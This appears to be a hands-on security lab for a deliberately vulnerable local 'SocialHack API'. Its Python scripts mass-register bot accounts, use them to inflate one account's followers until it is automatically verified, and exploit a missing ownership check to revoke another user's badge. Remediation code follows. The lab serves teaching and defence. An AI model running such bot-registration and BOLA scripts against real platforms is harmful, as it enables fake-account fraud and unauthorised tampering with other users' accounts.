# Lab 13: Unrestricted Access to Sensitive Business Flows

## Overview

| Field          | Details                                               |
|----------------|-------------------------------------------------------|
| **Objective**  | Automate the "verified badge" flow using bot accounts  |
| **Difficulty** | ⭐⭐ Medium                                           |
| **Time**       | 40 minutes                                            |
| **Category**   | Business Logic / Automation Abuse                      |
| **OWASP**      | API6:2023 - Unrestricted Access to Sensitive Business Flows |

---

## Prerequisites

- A running instance of **SocialHack API** at `http://localhost:5001`
- Python 3 with the `requests` library installed
- Completion of Lab 05 (Rate Limiting) is recommended — this lab chains a similar "no rate limiting" issue with a business-flow weakness

---

## Background

**Unrestricted Access to Sensitive Business Flows** occurs when an API exposes a legitimate business process (registration, purchasing, reservation, badge/trust granting, etc.) without considering what happens if that process is executed thousands of times per second by a script instead of a handful of times by a human.

SocialHack API grants a "verified badge" (`is_verified = true`) automatically once an account reaches a small follower threshold — no human review, no CAPTCHA, no cooldown. Combined with the fact that both account registration (`/api/v1/auth/register`) and following (`/api/v1/users/:id/follow`) have no rate limiting either, an attacker can script the entire chain: create bot accounts → have them follow a target account → instantly claim the verified badge for that target account.

---

## Tasks

### Task 1: Create a Target Account and Check Eligibility

**Steps:**
1. Register a new account (this will be your "target" that you want to get verified)
2. Call the eligibility endpoint and note the current follower count and threshold

**Python example:**
```python
import requests

BASE = "http://localhost:5001/api/v1"

r = requests.post(f"{BASE}/auth/register", json={
    "username": "mallory",
    "email": "mallory@socialhack.local",
    "password": "password123",
})
mallory_id = r.json()["user"]["id"]
mallory_token = r.json()["token"]
headers = {"Authorization": f"Bearer {mallory_token}"}

r = requests.get(f"{BASE}/promotions/verification/eligibility", headers=headers)
print(r.json())
```

<details>
<summary>💡 Hint 1</summary>
The eligibility endpoint is <code>GET /api/v1/promotions/verification/eligibility</code> and requires a valid token (any user's token works — it checks the token owner's own eligibility).
</details>

---

### Task 2: Script Bot Account Creation

Write a loop that registers several throwaway accounts. Note that registration requires no email verification, no CAPTCHA, and no proof of humanity.

**Python example:**
```python
import random, string

def random_username():
    return "bot_" + "".join(random.choices(string.ascii_lowercase, k=8))

bot_tokens = []
for i in range(5):
    username = random_username()
    r = requests.post(f"{BASE}/auth/register", json={
        "username": username,
        "email": f"{username}@fake.local",
        "password": "password123",
    })
    bot_tokens.append(r.json()["token"])
    print(f"Bot #{i+1} created: {username}")
```

<details>
<summary>💡 Hint 1</summary>
Check the "required_followers" value from Task 1's eligibility response — that's how many bot accounts you need at minimum.
</details>

---

### Task 3: Have Bot Accounts Follow the Target

**Steps:**
1. Use each bot account's token to call the follow endpoint against your target's `user_id`

**Python example:**
```python
for i, token in enumerate(bot_tokens):
    r = requests.post(
        f"{BASE}/users/{mallory_id}/follow",
        headers={"Authorization": f"Bearer {token}"},
    )
    print(f"Bot #{i+1} follow result: {r.status_code}")
```

<details>
<summary>💡 Hint 1</summary>
The follow endpoint is <code>POST /api/v1/users/:id/follow</code> — no rate limiting means you can call it back-to-back with no delay.
</details>

---

### Task 4: Claim the Verified Badge

**🚩 FLAG 1: Successfully get an account verified using only bot-account followers**

**Python example:**
```python
r = requests.get(f"{BASE}/promotions/verification/eligibility", headers=headers)
print("Eligibility now:", r.json())

r = requests.post(f"{BASE}/promotions/verification/apply", headers=headers)
print("Apply result:", r.json())
```

<details>
<summary>💡 Hint 1</summary>
If eligible=true from Task 1's endpoint after your bots followed the target, the apply endpoint should immediately set is_verified=true with no manual review.
</details>

<details>
<summary>💡 Hint 2</summary>
There's no cooldown — you could even call apply multiple times in a row (it should just report "already verified" once granted).
</details>

---

### Task 5: Abuse the Revoke Endpoint (BOLA)

Try revoking a *different* user's verified badge using your own token.

**🚩 FLAG 2: Revoke another user's verified badge without owning that account**

**Python example:**
```python
# Login as alice, then try to revoke diana's badge (diana's user_id, e.g. 5)
r = requests.post(f"{BASE}/auth/login", json={"username": "alice", "password": "password123"})
alice_headers = {"Authorization": f"Bearer {r.json()['token']}"}

r = requests.post(f"{BASE}/promotions/verification/revoke/5", headers=alice_headers)
print(r.json())
```

<details>
<summary>💡 Hint 1</summary>
The revoke endpoint never compares the authenticated user's ID against the `user_id` in the URL — it's a straightforward BOLA on top of a business-flow endpoint.
</details>

---

## Flags to Find

| Flag   | Description                                          | Hint                                      |
|--------|-------------------------------------------------------|--------------------------------------------|
| FLAG 1 | Get an account verified using only bot followers      | Script registration + follow + apply       |
| FLAG 2 | Revoke another user's badge (BOLA on business flow)    | `POST /promotions/verification/revoke/:id` |

---

## Remediation

### 1. Require Human Review for Sensitive Flows
```python
if followers_count >= THRESHOLD:
    create_verification_request(user_id=user.id, status="pending_review")
    # An admin reviews and approves manually — never auto-grant
```

### 2. Rate-Limit and Add Cooldowns to Business Flows, Not Just "Security" Endpoints
```python
@rate_limit(max_calls=1, window="24h", key="user_id")
def apply_verified_badge():
    ...
```

### 3. Detect Automation on the Inputs That Feed the Business Rule
- Flag accounts created in rapid succession from the same IP/device
- Weight followers by account age/activity rather than counting them equally
- Add CAPTCHA to registration and to the apply endpoint

### 4. Fix the Ownership Check on Revoke
```python
if user_id != request.current_user_id and not is_admin(request.current_user_id):
    return jsonify({"error": "Forbidden"}), 403
```

---

## References

- [OWASP API Security Top 10 - API6:2023](https://owasp.org/API-Security/editions/2023/en/0xa6-unrestricted-access-to-sensitive-business-flows/)
- [CWE-799: Improper Control of Interaction Frequency](https://cwe.mitre.org/data/definitions/799.html)
